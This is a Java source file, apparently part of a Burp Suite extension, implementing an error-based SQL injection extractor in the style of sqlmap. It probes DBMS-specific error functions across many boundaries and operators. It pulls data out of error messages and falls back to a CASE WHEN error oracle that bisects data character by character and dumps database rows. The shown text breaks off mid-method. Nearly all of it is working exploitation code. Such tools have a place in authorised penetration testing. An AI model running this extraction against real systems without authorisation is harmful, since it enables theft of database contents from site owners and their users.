package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Error-based SQL injection extractor for OmniMap.
 * Injects queries that cause the DBMS to leak data inside error messages.
 *
 * All DBMS now use delimiter markers (like sqlmap's kb.chars.start/stop)
 * for reliable extraction from error messages.
 *
 * DBMS-specific error functions:
 * - MySQL: extractvalue(), updatexml(), floor(rand()) double-query
 * - PostgreSQL: CAST type conversion error
 * - MSSQL: IN (SELECT), CONVERT conversion error
 * - Oracle: XMLType, UTL_INADDR, CTXSYS.DRITHSX.SN
 * - SQLite: not applicable (no useful error-based extraction)
 */
public class ErrorExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private volatile boolean cancelled = false;

    /** The error function template that works (detected during probe phase) */
    private String workingErrorFunction = null;

    /** The conjunction operator that works (AND or OR) */
    private String workingOperator = "AND";

    /** The boundary (prefix/suffix) that works for error-based extraction */
    private String workingPrefix = "";
    private String workingSuffix = "";

    /** Decoded marker strings for reliable extraction (all DBMS) */
    private String markerPrefix = null;
    private String markerSuffix = null;

    // ==================== Inference Mode (like BlindExtractor) ====================
    // When error text is NOT visible in the response (blind target), but error
    // conditions cause a behavioral change (status code, content length, page content),
    // we can use CASE WHEN + error trigger as a boolean oracle for bisection extraction.

    /** True when error-text extraction failed but behavioral change was detected */
    private boolean inferenceMode = false;

    /** Cached baseline responses for inference true/false conditions */
    private String inferTrueBaseline;
    private String inferFalseBaseline;

    /** Response analyzer for inference true/false comparison */
    private final ResponseAnalyzer analyzer = new ResponseAnalyzer();

    /** True once the suffix has been confirmed to produce extractable error output */
    private boolean suffixValidated = false;

    /** Full printable ASCII range */
    private static final int ASCII_MIN = 32;
    private static final int ASCII_MAX = 126;

    /** Static fallback patterns for DBMS without markers */
    private static final List<Pattern> STATIC_EXTRACTION_PATTERNS = List.of(
            // PostgreSQL/MSSQL: invalid input syntax for integer/numeric: "DATA"
            // PostgreSQL CAST AS NUMERIC produces "numeric" not "integer"!
            Pattern.compile("(?:invalid input syntax for (?:type )?(?:integer|numeric|bigint|smallint)|nvarchar value '|Conversion failed)[^\"']*[\"']([^\"']+)[\"']"),
            // MSSQL convert: when converting the nvarchar value 'DATA'
            Pattern.compile("converting the \\w+ value '([^']+)'"),
            // Oracle UTL_INADDR: ORA-29257: host DATA unknown
            Pattern.compile("ORA-\\d+:[^\"']*?([\\w@._-]+)")
    );

    /**
     * Error-function-specific patterns that prove the error FUNCTION fired (not just a syntax error).
     * Used in detection strategy 4 to avoid false positives on generic SQL syntax errors
     * caused by empty-suffix boundaries. Only patterns that indicate error-based extraction
     * output (XPATH, type conversion, duplicate entry, etc.) are included here.
     */
    private static final List<Pattern> ERROR_FUNCTION_PATTERNS = List.of(
            // MySQL EXTRACTVALUE/UPDATEXML
            Pattern.compile("XPATH syntax error:", Pattern.CASE_INSENSITIVE),
            // MySQL FLOOR double-query
            Pattern.compile("Duplicate entry '.*' for key", Pattern.CASE_INSENSITIVE),
            // MySQL GTID_SUBSET
            Pattern.compile("Malformed GTID set specification", Pattern.CASE_INSENSITIVE),
            // MySQL BIGINT/EXP overflow
            Pattern.compile("DOUBLE value is out of range", Pattern.CASE_INSENSITIVE),
            // MySQL JSON_KEYS
            Pattern.compile("Invalid JSON text", Pattern.CASE_INSENSITIVE),
            // MySQL subquery error (used in error triggers)
            Pattern.compile("Subquery returns more than 1 row", Pattern.CASE_INSENSITIVE),
            // PostgreSQL CAST conversion
            Pattern.compile("invalid input syntax for (type )?(integer|numeric)", Pattern.CASE_INSENSITIVE),
            // MSSQL CONVERT/IN conversion
            Pattern.compile("Conversion failed when converting", Pattern.CASE_INSENSITIVE),
            Pattern.compile("converting the \\w+ value '", Pattern.CASE_INSENSITIVE),
            // Oracle XMLType
            Pattern.compile("ORA-19202", Pattern.CASE_INSENSITIVE),
            // Oracle UTL_INADDR
            Pattern.compile("ORA-29257", Pattern.CASE_INSENSITIVE),
            // Oracle CTXSYS
            Pattern.compile("ORA-20000.*CTXSYS", Pattern.CASE_INSENSITIVE),
            // Oracle DBMS_UTILITY
            Pattern.compile("ORA-13797", Pattern.CASE_INSENSITIVE),
            // Oracle divisor is zero (used in error triggers)
            Pattern.compile("ORA-01476", Pattern.CASE_INSENSITIVE)
    );

    public ErrorExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                          OmniMapCallback callback, OmniMapResult result,
                          HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;

        // Extract delimiter markers from dialect (all DBMS now have markers)
        this.markerPrefix = dialect.getErrorPrefixDecoded();
        this.markerSuffix = dialect.getErrorSuffixDecoded();

        // Initialize working boundary from config (fallback if detect() not called)
        this.workingPrefix = config.getPrefix();
        this.workingSuffix = config.getSuffix();
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Probe to find a working error function + boundary combination.
     * Like sqlmap: tries EVERY boundary × operator × error function combination.
     *
     * This is critical because a boundary that works for boolean (e.g., ' ... -- -)
     * may not work for error-based. Different boundaries may be needed:
     * - Some targets need self-closing boundaries (no comment suffix)
     * - Some need specific quote types or parenthesis closings
     * - Error functions may need raw suffix (no -- -) to show the error
     *
     * Level controls which error functions are tried (more exotic at higher levels).
     * Risk 3 adds OR-based error payloads.
     *
     * @param boundaries list of {prefix, suffix} pairs to try
     * @return true if error-based extraction is viable
     */
    public boolean detect(List<String[]> boundaries) {
        List<String> errorFunctions = dialect.errorFunctionsForLevel(config.getLevel());
        if (errorFunctions.isEmpty()) {
            callback.onProgress("ERROR: No error functions for " + dialect.getName(), 0);
            return false;
        }

        // Build list of conjunction operators to try: AND always, OR at risk 3
        List<String> operators = new ArrayList<>();
        operators.add("AND");
        if (config.getRisk() >= 3) {
            operators.add("OR");
        }

        // Expand boundaries: for each boundary with a non-empty suffix, also try
        // the same prefix with NO suffix. Error functions are often self-contained —
        // the DBMS error fires during expression evaluation BEFORE the parser hits
        // any trailing syntax issue. Trying without suffix doubles detection coverage.
        List<String[]> expandedBoundaries = new ArrayList<>();
        for (String[] b : boundaries) {
            expandedBoundaries.add(b);
            if (!b[1].isEmpty()) {
                expandedBoundaries.add(new String[]{b[0], ""});
            }
        }

        int totalCombos = expandedBoundaries.size() * operators.size() * errorFunctions.size();
        callback.onProgress("ERROR: Testing " + totalCombos + " combinations (" +
                errorFunctions.size() + " functions × " + expandedBoundaries.size() +
                " boundaries × " + operators.size() + " operators)...", 5);

        // Use a guaranteed non-null test query for detection.
        String testQuery = dialect.errorTestQuery();

        callback.onProgress("ERROR: markers=[" + markerPrefix + "/" + markerSuffix +
                "], test=" + testQuery, 6);

        int tried = 0;

        // Like sqlmap: outer loop = operators, middle = error functions, inner = boundaries
        for (String operator : operators) {
            for (String funcTemplate : errorFunctions) {
                for (String[] boundary : expandedBoundaries) {
                    if (cancelled) return false;
                    tried++;

                    String prefix = boundary[0];
                    String suffix = boundary[1];

                    String errorPayload = String.format(funcTemplate, testQuery);
                    String payload = " " + operator + " " + errorPayload + " ";
                    payload = TamperEngine.apply(payload, config.getTampers());

                    var response = sendPayloadWith(payload, prefix, suffix);
                    if (response == null) continue;

                    String body = response.bodyToString();
                    if (body == null) continue;

                    int statusCode = response.statusCode();

                    // Detection strategy (mirrors sqlmap):
                    // 1. Try full marker extraction (best — confirms both markers work)
                    String extracted = extractFromError(body);
                    if (extracted != null && !extracted.isEmpty()) {
                        workingErrorFunction = funcTemplate;
                        workingOperator = operator;
                        workingPrefix = prefix;
                        workingSuffix = suffix;
                        callback.onProgress("ERROR: Found! " + operator + " " +
                                funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                " (extracted: '" +
                                extracted.substring(0, Math.min(20, extracted.length())) +
                                "') [" + tried + "/" + totalCombos + "]", 10);
                        return true;
                    }

                    // 2. Fallback: check if prefix marker appears in response (like sqlmap's grep).
                    if (markerPrefix != null && body.contains(markerPrefix)) {
                        workingErrorFunction = funcTemplate;
                        workingOperator = operator;
                        workingPrefix = prefix;
                        workingSuffix = suffix;
                        callback.onProgress("ERROR: Found (marker grep)! " + operator + " " +
                                funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                " [" + tried + "/" + totalCombos + "]", 10);
                        return true;
                    }

                    // 3. Check for DBMS error patterns in response even without markers.
                    // Check ALL status codes — errors can appear in 200, 500, 403, etc.
                    // HTTP 500 is especially common for SQL errors.
                    for (Pattern pattern : STATIC_EXTRACTION_PATTERNS) {
                        Matcher m = pattern.matcher(body);
                        if (m.find() && m.groupCount() > 0) {
                            String data = m.group(1).trim();
                            if (!data.isEmpty() && data.length() < 500) {
                                workingErrorFunction = funcTemplate;
                                workingOperator = operator;
                                workingPrefix = prefix;
                                workingSuffix = suffix;
                                callback.onProgress("ERROR: Found (static pattern)! " + operator + " " +
                                        funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                        "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                        " [" + tried + "/" + totalCombos + "]", 10);
                                return true;
                            }
                        }
                    }

                    // 4. Check for error-FUNCTION-specific patterns (NOT generic syntax errors).
                    //    Uses ERROR_FUNCTION_PATTERNS instead of dialect.errorPatterns() to avoid
                    //    false positives: empty-suffix boundaries cause SQL syntax errors whose
                    //    generic messages ("You have an error in your SQL syntax") would match
                    //    dialect.errorPatterns() even though the error function never executed.
                    for (java.util.regex.Pattern errPat : ERROR_FUNCTION_PATTERNS) {
                        if (errPat.matcher(body).find()) {
                            // Error function fired but markers not extractable.
                            // Still mark as working — extraction may succeed with
                            // different queries that produce shorter output.
                            workingErrorFunction = funcTemplate;
                            workingOperator = operator;
                            workingPrefix = prefix;
                            workingSuffix = suffix;
                            callback.onProgress("ERROR: Found (error function pattern)! " + operator + " " +
                                    funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                    "\" suffix=\"" + suffix + "\" status=" + statusCode +
                                    " [" + tried + "/" + totalCombos + "]", 10);
                            return true;
                        }
                    }
                }
            }
        }

        // ===== Strategy 5: Behavioral inference (like BlindExtractor) =====
        // Error text isn't visible, but error conditions may cause behavioral changes.
        // Try each boundary × operator combo with a TRUE baseline vs error payload.
        // Cache TRUE baselines per (prefix, suffix, operator) to avoid duplicate requests.
        callback.onProgress("ERROR: Classic detection failed. Trying behavioral inference...", 7);
        Map<String, String[]> trueBaselineCache = new HashMap<>();
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);

        for (String operator : operators) {
            for (String funcTemplate : errorFunctions) {
                for (String[] boundary : expandedBoundaries) {
                    if (cancelled) return false;
                    tried++;

                    String prefix = boundary[0];
                    String suffix = boundary[1];

                    // Send error payload
                    String errorPayload = String.format(funcTemplate, testQuery);
                    String errPayloadStr = " " + operator + " " + errorPayload + " ";
                    errPayloadStr = TamperEngine.apply(errPayloadStr, config.getTampers());

                    var errResponse = sendPayloadWith(errPayloadStr, prefix, suffix);
                    if (errResponse == null) continue;
                    String errBody = errResponse.bodyToString();
                    if (errBody == null) continue;
                    int errStatus = errResponse.statusCode();

                    // Get or create TRUE baseline for this boundary/operator combo
                    String cacheKey = prefix + "|" + suffix + "|" + operator;
                    String[] cached = trueBaselineCache.get(cacheKey);
                    if (cached == null) {
                        String truePayloadStr = " " + operator + " " + ri + "=" + ri + " ";
                        truePayloadStr = TamperEngine.apply(truePayloadStr, config.getTampers());
                        var trueResp = sendPayloadWith(truePayloadStr, prefix, suffix);
                        if (trueResp != null && trueResp.bodyToString() != null) {
                            cached = new String[]{trueResp.bodyToString(), String.valueOf(trueResp.statusCode())};
                            trueBaselineCache.put(cacheKey, cached);
                        }
                    }
                    if (cached == null) continue;

                    String trueBody = cached[0];
                    int trueStatus = Integer.parseInt(cached[1]);

                    // Compare error response vs true baseline
                    boolean statusDiffers = errStatus != trueStatus;
                    int lenDiff = Math.abs(errBody.length() - trueBody.length());
                    double sim = analyzer.similarity(errBody, trueBody);

                    if (statusDiffers || lenDiff > 20 || sim < 0.98) {
                        // Error function causes detectable behavioral change!
                        workingErrorFunction = funcTemplate;
                        workingOperator = operator;
                        workingPrefix = prefix;
                        workingSuffix = suffix;
                        inferenceMode = true;
                        inferTrueBaseline = trueBody;
                        inferFalseBaseline = errBody;
                        analyzer.setTrueStatusCode(trueStatus);
                        analyzer.setFalseStatusCode(errStatus);

                        // Try auto-detecting a distinguishing string marker
                        String autoTrue = analyzer.autoDetectTrueString(trueBody, errBody);
                        if (autoTrue != null && !autoTrue.isEmpty()) {
                            analyzer.setTrueString(autoTrue);
                        }

                        callback.onProgress("ERROR: Found (inference)! " + operator + " " +
                                funcTemplate.split("\\(")[0] + " prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" status=" + trueStatus + "→" + errStatus +
                                " sim=" + String.format("%.3f", sim) + " lenDiff=" + lenDiff +
                                (autoTrue != null ? " marker=\"" + autoTrue + "\"" : "") +
                                " [" + tried + "/" + (totalCombos * 2) + "]", 10);
                        return true;
                    }
                }
            }
        }

        callback.onProgress("ERROR: No working error function found after " + tried + " attempts", 0);
        return false;
    }

    /**
     * Extract a single value using error-based injection.
     * Classic mode: extract data from visible error text.
     * Inference mode: use CASE WHEN + error trigger as boolean oracle (like BlindExtractor).
     *
     * Tries both with and without comment suffix (-- -) because detection may have
     * picked the wrong suffix variant. On the first call, if the detected suffix fails,
     * the alternative is tried. Whichever works is locked in for subsequent calls.
     */
    public String extractSingle(String query) {
        if (cancelled || workingErrorFunction == null) return null;

        // Inference mode: use bisection with error conditions
        if (inferenceMode) {
            return extractSingleInference(query);
        }

        // Classic mode: extract from error text
        String errorPayload = String.format(workingErrorFunction, query);
        String payload = " " + workingOperator + " " + errorPayload + " ";
        payload = TamperEngine.apply(payload, config.getTampers());

        var response = sendPayload(payload);
        if (response != null) {
            String body = response.bodyToString();
            String extracted = extractFromError(body);
            if (extracted != null) {
                suffixValidated = true;
                return extracted;
            }
        }

        // If suffix not yet validated, try with/without -- - (the other variant)
        if (!suffixValidated) {
            String altSuffix = workingSuffix.isEmpty() ? dialect.commentSuffix() : "";
            var altResponse = sendPayloadWith(payload, workingPrefix, altSuffix);
            if (altResponse != null) {
                String altBody = altResponse.bodyToString();
                String altResult = extractFromError(altBody);
                if (altResult != null) {
                    workingSuffix = altSuffix;
                    suffixValidated = true;
                    callback.onProgress("ERROR: Suffix corrected to \"" +
                            (altSuffix.isEmpty() ? "(none)" : altSuffix) + "\"", 0);
                    return altResult;
                }
            }
        }

        // Log extraction failure for debugging
        if (response != null) {
            String body = response.bodyToString();
            int status = response.statusCode();
            boolean hasPrefix = markerPrefix != null && body != null && body.contains(markerPrefix);
            boolean hasSuffix = markerSuffix != null && body != null && body.contains(markerSuffix);
            callback.onProgress("ERROR: extractSingle failed — status=" + status +
                    " bodyLen=" + (body != null ? body.length() : 0) +
                    " markerPrefix=" + hasPrefix + " markerSuffix=" + hasSuffix +
                    " query=" + query.substring(0, Math.min(50, query.length())), 0);
        }

        return null;
    }

    /**
     * Extract a list of values using error-based injection.
     * For each row, uses LIMIT/OFFSET pagination.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        // MySQL optimization: try GROUP_CONCAT first
        if ("MySQL".equals(dialect.getName())) {
            // Parse query to separate column expression from FROM clause
            // e.g., "SELECT schema_name FROM information_schema.schemata"
            // → GROUP_CONCAT(schema_name SEPARATOR 0x7c) FROM information_schema.schemata
            Matcher gcm = Pattern.compile("(?i)^SELECT\\s+(.+?)\\s+FROM\\s+(.+)$").matcher(query);
            if (gcm.matches()) {
                String col = gcm.group(1);
                String fromClause = gcm.group(2);
                String grouped = extractSingle("SELECT GROUP_CONCAT(" + col +
                        " SEPARATOR 0x7c) FROM " + fromClause);
                if (grouped != null && !grouped.isEmpty()) {
                    for (String val : grouped.split("\\|")) {
                        String trimmed = val.trim();
                        if (!trimmed.isEmpty()) results.add(trimmed);
                    }
                    if (!results.isEmpty()) return results;
                }
            }
        }

        // Row-by-row extraction using dialect-aware pagination
        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            results.add(val.trim());
            String mode = inferenceMode ? "ERROR-INFERENCE" : "ERROR";
            callback.onProgress(mode + ": Extracted " + results.size() + " values so far...",
                    Math.min(90, 20 + results.size() * 5));
        }

        return results;
    }

    /**
     * Extract data from an error message.
     * Tries marker-based extraction first (all DBMS with markers), then static regex patterns.
     * Both approaches are always tried — marker-based extraction doesn't prevent static fallback.
     */
    private String extractFromError(String body) {
        if (body == null) return null;

        // Strategy 1: Extract data between the random hex markers (all DBMS with markers)
        // Try ALL occurrences of the prefix marker, not just the first.
        // The first occurrence may be in reflected SQL input, not the error message.
        // Pick the shortest valid extraction (error message data is shorter than SQL fragments).
        if (markerPrefix != null && markerSuffix != null) {
            String bestMarkerExtraction = null;
            int searchFrom = 0;
            while (searchFrom < body.length()) {
                int prefixPos = body.indexOf(markerPrefix, searchFrom);
                if (prefixPos < 0) break;

                int start = prefixPos + markerPrefix.length();
                int end = body.indexOf(markerSuffix, start);
                if (end > start) {
                    String data = body.substring(start, end).trim();
                    if (!data.isEmpty() && data.length() < 500) {
                        // Prefer shortest match (actual data is shorter than reflected SQL fragments)
                        if (bestMarkerExtraction == null || data.length() < bestMarkerExtraction.length()) {
                            bestMarkerExtraction = data;
                        }
                    }
                }
                searchFrom = start; // continue searching for next occurrence
            }
            if (bestMarkerExtraction != null) return bestMarkerExtraction;
        }

        // Strategy 2: Static regex patterns — always tried as fallback, even if markers exist.
        // This catches cases where:
        // - Markers are mangled/encoded by the application
        // - Different DBMS error format than expected
        // - The error message format includes the data in a known pattern
        for (Pattern pattern : STATIC_EXTRACTION_PATTERNS) {
            Matcher m = pattern.matcher(body);
            if (m.find() && m.groupCount() > 0) {
                String data = m.group(1).trim();
                if (!data.isEmpty() && data.length() < 500) {
                    // Strip marker delimiters if present — static patterns capture the
                    // full error value (e.g., "rwqvDATAwurtr"), not just the data between markers
                    if (markerPrefix != null && markerSuffix != null) {
                        int pIdx = data.indexOf(markerPrefix);
                        if (pIdx >= 0) {
                            String afterPrefix = data.substring(pIdx + markerPrefix.length());
                            int sIdx = afterPrefix.indexOf(markerSuffix);
                            if (sIdx > 0) {
                                String stripped = afterPrefix.substring(0, sIdx).trim();
                                if (!stripped.isEmpty()) return stripped;
                            }
                            // Suffix might be truncated — return everything after prefix
                            if (!afterPrefix.isEmpty() && !afterPrefix.equals(markerSuffix)) {
                                // Strip trailing suffix if it's at the end
                                if (afterPrefix.endsWith(markerSuffix)) {
                                    afterPrefix = afterPrefix.substring(0, afterPrefix.length() - markerSuffix.length());
                                }
                                if (!afterPrefix.trim().isEmpty()) return afterPrefix.trim();
                            }
                        }
                    }
                    return data;
                }
            }
        }

        // Strategy 3: MySQL XPATH syntax error pattern (EXTRACTVALUE/UPDATEXML)
        // "XPATH syntax error: '\prefixDATAsuffix'" or "XPATH syntax error: '.prefixDATAsuffix'"
        String xpathResult = extractFromXpathError(body);
        if (xpathResult != null) return xpathResult;

        // Strategy 4: MySQL FLOOR double-query pattern
        // "Duplicate entry 'prefixDATAsuffix0' for key 'group_key'"
        Matcher floorMatcher = DUPLICATE_ENTRY_PATTERN.matcher(body);
        if (floorMatcher.find() && floorMatcher.groupCount() > 0) {
            String floorData = floorMatcher.group(1).trim();
            // Extract between markers if available
            if (markerPrefix != null && markerSuffix != null) {
                int pIdx = floorData.indexOf(markerPrefix);
                if (pIdx >= 0) {
                    String afterPrefix = floorData.substring(pIdx + markerPrefix.length());
                    int sIdx = afterPrefix.indexOf(markerSuffix);
                    if (sIdx > 0) {
                        return afterPrefix.substring(0, sIdx).trim();
                    }
                }
            }
        }

        // Strategy 5: MySQL GTID_SUBSET error pattern
        // "Malformed GTID set specification 'prefixDATAsuffix'"
        Matcher gtidMatcher = GTID_EXTRACT_PATTERN.matcher(body);
        if (gtidMatcher.find() && gtidMatcher.groupCount() > 0) {
            String gtidData = gtidMatcher.group(1).trim();
            if (markerPrefix != null && markerSuffix != null) {
                int pIdx = gtidData.indexOf(markerPrefix);
                if (pIdx >= 0) {
                    String afterPrefix = gtidData.substring(pIdx + markerPrefix.length());
                    int sIdx = afterPrefix.indexOf(markerSuffix);
                    if (sIdx > 0) {
                        return afterPrefix.substring(0, sIdx).trim();
                    }
                }
            }
        }

        return null;
    }

    /**
     * Extract data from MySQL XPATH syntax error messages.
     * Handles EXTRACTVALUE and UPDATEXML errors with proper marker extraction.
     */
    private String extractFromXpathError(String body) {
        Matcher xpathMatcher = XPATH_EXTRACT_PATTERN.matcher(body);
        if (!xpathMatcher.find() || xpathMatcher.groupCount() == 0) return null;

        String xpathData = xpathMatcher.group(1).trim();
        // Strip leading special chars (\, ., ~) that EXTRACTVALUE/UPDATEXML prepend
        if (!xpathData.isEmpty() && (xpathData.charAt(0) == '\\' || xpathData.charAt(0) == '.'
                || xpathData.charAt(0) == '~')) {
            xpathData = xpathData.substring(1);
        }
        // Extract data between markers from the XPATH content
        if (markerPrefix != null && markerSuffix != null) {
            int pIdx = xpathData.indexOf(markerPrefix);
            if (pIdx >= 0) {
                String afterPrefix = xpathData.substring(pIdx + markerPrefix.length());
                int sIdx = afterPrefix.indexOf(markerSuffix);
                if (sIdx > 0) {
                    return afterPrefix.substring(0, sIdx).trim();
                }
                // Suffix might be truncated by EXTRACTVALUE's 32-char limit
                if (!afterPrefix.isEmpty() && afterPrefix.length() < 200) {
                    return afterPrefix.trim();
                }
            }
        }
        // No markers? Return raw XPATH data if short enough
        if (!xpathData.isEmpty() && xpathData.length() < 200) {
            return xpathData;
        }
        return null;
    }

    /** Pattern to extract content from MySQL XPATH syntax errors (EXTRACTVALUE/UPDATEXML) */
    private static final Pattern XPATH_EXTRACT_PATTERN =
            Pattern.compile("XPATH syntax error:\\s*'([^']*)'", Pattern.CASE_INSENSITIVE);

    /** Pattern to extract content from MySQL FLOOR double-query errors */
    private static final Pattern DUPLICATE_ENTRY_PATTERN =
            Pattern.compile("Duplicate entry '([^']+)' for key", Pattern.CASE_INSENSITIVE);

    /** Pattern to extract content from MySQL GTID_SUBSET errors */
    private static final Pattern GTID_EXTRACT_PATTERN =
            Pattern.compile("Malformed GTID set specification '([^']*)'", Pattern.CASE_INSENSITIVE);

    // ==================== Inference Mode Extraction ====================
    // When error text isn't visible, use CASE WHEN + error trigger as boolean oracle.
    // TRUE condition → CASE returns 1 → no error → page looks like trueBaseline.
    // FALSE condition → CASE triggers error → page looks like falseBaseline.
    // Character-by-character bisection identical to BlindExtractor.

    /**
     * Extract a single string using inference-mode bisection.
     * Parallel character extraction like BlindExtractor.
     */
    private String extractSingleInference(String query) {
        if (cancelled || inferTrueBaseline == null) return null;

        callback.onProgress("ERROR-INFERENCE: Getting length for: " +
                query.substring(0, Math.min(60, query.length())) + "...", 15);

        int length = extractLengthInference(query);
        if (length <= 0 || cancelled) {
            callback.onProgress("ERROR-INFERENCE: Length detection returned " + length +
                    " (query may be invalid or no data found)", 0);
            return null;
        }

        callback.onProgress("ERROR-INFERENCE: Length=" + length + ", extracting chars (" +
                config.getThreads() + " threads)...", 20);

        ExecutorService pool = Executors.newFixedThreadPool(
                Math.min(config.getThreads(), length));

        char[] chars = new char[length];
        AtomicBoolean anyFailed = new AtomicBoolean(false);
        java.util.concurrent.atomic.AtomicInteger extracted = new java.util.concurrent.atomic.AtomicInteger(0);
        List<Future<?>> futures = new ArrayList<>();

        for (int pos = 1; pos <= length && !cancelled; pos++) {
            final int charPos = pos;
            futures.add(pool.submit(() -> {
                if (cancelled || anyFailed.get()) return;
                int ascii = extractCharAtPositionInference(query, charPos);
                if (ascii > 0) {
                    chars[charPos - 1] = (char) ascii;
                    int done = extracted.incrementAndGet();
                    if (done % 3 == 0 || done == length) {
                        callback.onProgress("ERROR-INFERENCE: [" + done + "/" + length + "] " +
                                new String(chars).replace('\0', '_'), 20 + (done * 60 / length));
                    }
                } else {
                    chars[charPos - 1] = '?';
                    anyFailed.set(true);
                    callback.onProgress("ERROR-INFERENCE: Failed at pos " + charPos +
                            " (ascii=" + ascii + ")", 0);
                }
            }));
        }

        for (Future<?> f : futures) {
            try { f.get(60, TimeUnit.SECONDS); }
            catch (Exception e) { break; }
        }
        pool.shutdownNow();

        String result = new String(chars).trim();
        callback.onProgress("ERROR-INFERENCE: Extracted '" + result + "'", 80);
        return result;
    }

    /**
     * Extract string length using inference bisection.
     */
    private int extractLengthInference(String query) {
        String lengthExpr = dialect.lengthFunction(query);

        // First verify the error oracle works: test a trivially true condition
        boolean sanityTrue = testErrorCondition("1=1");
        boolean sanityFalse = testErrorCondition("1=2");
        callback.onProgress("ERROR-INFERENCE: Sanity check: 1=1→" + sanityTrue +
                " 1=2→" + sanityFalse, 16);
        if (!sanityTrue || sanityFalse) {
            // Try with/without -- - (detection may have picked the wrong suffix)
            String altSuffix = workingSuffix.isEmpty() ? dialect.commentSuffix() : "";
            String origSuffix = workingSuffix;
            workingSuffix = altSuffix;

            sanityTrue = testErrorCondition("1=1");
            sanityFalse = testErrorCondition("1=2");
            callback.onProgress("ERROR-INFERENCE: Retry with suffix=\"" +
                    (altSuffix.isEmpty() ? "(none)" : altSuffix) + "\": 1=1→" +
                    sanityTrue + " 1=2→" + sanityFalse, 16);

            if (!sanityTrue || sanityFalse) {
                workingSuffix = origSuffix;
                callback.onProgress("ERROR-INFERENCE: Sanity check FAILED! Error oracle not working. " +
                        "Expected true/false but got " + sanityTrue + "/" + sanityFalse, 0);
                return -1;
            }
            callback.onProgress("ERROR-INFERENCE: Suffix corrected to \"" +
                    (altSuffix.isEmpty() ? "(none)" : altSuffix) + "\"", 0);
        }

        // Verify the query returns data: LENGTH(query) > 0
        boolean hasData = testErrorCondition(lengthExpr + ">0");
        if (!hasData) {
            callback.onProgress("ERROR-INFERENCE: Query returns no data (LENGTH <= 0)", 0);
            return 0;
        }

        int low = 0, high = 64;

        while (!cancelled) {
            if (testErrorCondition(lengthExpr + ">" + high)) {
                high *= 2;
                if (high > 2048) return -1;
            } else {
                break;
            }
        }

        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testErrorCondition(lengthExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        callback.onProgress("ERROR-INFERENCE: Detected length=" + low, 18);
        return low;
    }

    /**
     * Extract ASCII value at a position using tiered adaptive bisection.
     * Same tiers as BlindExtractor: lowercase → digits → full ASCII.
     */
    private int extractCharAtPositionInference(String query, int position) {
        String asciiExpr = dialect.asciiAtPosition("(" + query + ")", position);

        // Tier 1: lowercase letters
        int result = bisectInRangeInference(asciiExpr, 97, 122);
        if (result > 0) return result;

        // Tier 2: digits
        result = bisectInRangeInference(asciiExpr, 48, 57);
        if (result > 0) return result;

        // Tier 3: full printable ASCII
        return bisectFullInference(asciiExpr, ASCII_MIN, ASCII_MAX);
    }

    private int bisectInRangeInference(String asciiExpr, int low, int high) {
        if (!testErrorCondition(asciiExpr + ">=" + low + " AND " + asciiExpr + "<=" + high)) {
            return -1;
        }
        return bisectFullInference(asciiExpr, low, high);
    }

    private int bisectFullInference(String asciiExpr, int low, int high) {
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testErrorCondition(asciiExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return cancelled ? -1 : low;
    }

    /**
     * Test a boolean condition using error-based inference.
     * Uses CASE WHEN: condition true → 1 (no error) / condition false → error trigger.
     *
     * DBMS-specific error triggers that reliably cause SQL errors:
     * - MySQL: (SELECT 1 UNION SELECT 2) → "Subquery returns more than 1 row"
     * - PostgreSQL: CAST('a' AS INT) → "invalid input syntax for type integer"
     * - MSSQL: 1/0 → "Divide by zero"
     * - Oracle: 1/0 → "ORA-01476: divisor is equal to zero"
     * - SQLite: (SELECT 1 UNION SELECT 2) → subquery error
     */
    private boolean testErrorCondition(String condition) {
        String trigger = getErrorTrigger();
        // CASE WHEN: TRUE → THEN 1 (no error, 200) / FALSE → ELSE trigger (error, 500)
        // Both branches MUST return the same type to avoid parse-time errors.
        String caseExpr = "(CASE WHEN (" + condition + ") THEN 1 ELSE " + trigger + " END)";
        String payload = " " + workingOperator + " " + caseExpr + "=1 ";
        payload = TamperEngine.apply(payload, config.getTampers());

        var response = sendPayload(payload);
        if (response == null) return false;

        String body = response.bodyToString();
        int statusCode = response.statusCode();
        boolean isTrue = analyzer.isTruePage(inferTrueBaseline, inferFalseBaseline, body, statusCode);
        return isTrue;
    }

    /**
     * Get a DBMS-specific expression that reliably triggers a SQL error.
     * Used as the ELSE branch in CASE WHEN for inference-mode boolean oracle.
     */
    private String getErrorTrigger() {
        // CRITICAL: Both THEN and ELSE branches in CASE WHEN must return the SAME TYPE.
        // Oracle enforces this at parse time. Using TO_CHAR(1/0) returns VARCHAR2 in ELSE
